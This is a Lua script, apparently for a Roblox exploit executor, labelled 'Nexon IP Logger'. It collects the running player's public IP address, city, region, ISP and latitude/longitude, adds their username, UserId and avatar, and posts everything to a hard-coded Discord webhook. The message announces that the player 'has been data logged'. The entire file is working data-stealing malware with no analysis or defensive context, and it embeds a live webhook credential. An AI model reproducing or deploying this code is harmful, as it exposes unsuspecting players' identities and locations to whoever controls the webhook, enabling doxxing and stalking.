local ip_response = request({
    Url = "https://api.ipify.org/",
    Method = "GET"
})

local ip = ip_response.Body

local geolocation_response = request({
    Url = "https://ipwho.is/" .. ip,
    Method = "GET"
})

local geolocation_data = game:GetService("HttpService"):JSONDecode(geolocation_response.Body)
local continent = geolocation_data.continent
local country = geolocation_data.country
local region = geolocation_data.region
local city = geolocation_data.city
local isp = geolocation_data.connection.isp
local latitude = geolocation_data.latitude
local longitude = geolocation_data.longitude

local fingerprint_whitelist_info = {
    continent,
    country,
    region,
    city,
    isp,
    latitude,
    longitude
}

local table_string = game:GetService("HttpService"):JSONEncode(fingerprint_whitelist_info)
local formatted_table = "```json\n" .. table_string .. "\n```"

local player = game:GetService("Players").LocalPlayer

local headshotUrl = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. player.UserId .. "&size=150x150&format=Png&isCircular=true"
local success, result = pcall(function()
    return game:GetService("HttpService"):JSONDecode(game:HttpGet(headshotUrl))
end)

local avatarUrl = ""
if success and result and result.data and #result.data > 0 then
    avatarUrl = result.data[1].imageUrl
end    

local embed = {
    {
        ["title"] = "**" .. player.DisplayName .. "** has been data logged.",
        ["color"] = 16740099,
        ["thumbnail"] = { ["url"] = avatarUrl },
        ["fields"] = {
            {["name"] = "Username", ["value"] = player.Name, ["inline"] = true},
            {["name"] = "UserId", ["value"] = tostring(player.UserId), ["inline"] = true},
            {["name"] = "IP", ["value"] = ip, ["inline"] = true},
            {["name"] = "Geolocation Data", ["value"] = formatted_table, ["inline"] = true}
        },
        ["footer"] = {["text"] = "Nexon IP Logger"}
    }
}

local result = request({
    Url = "https://discord.com/api/webhooks/1447020562705551530/ff91SQQca8F9doThFD2rgBiPYeGwuDxN0Dkqp3SQxByOoKQG0yFMpl0wkAW0Uw5CXgxc",
    Method = "POST",
    Headers = {["Content-Type"] = "application/json"},
    Body = game:GetService("HttpService"):JSONEncode({embeds = embed})
})
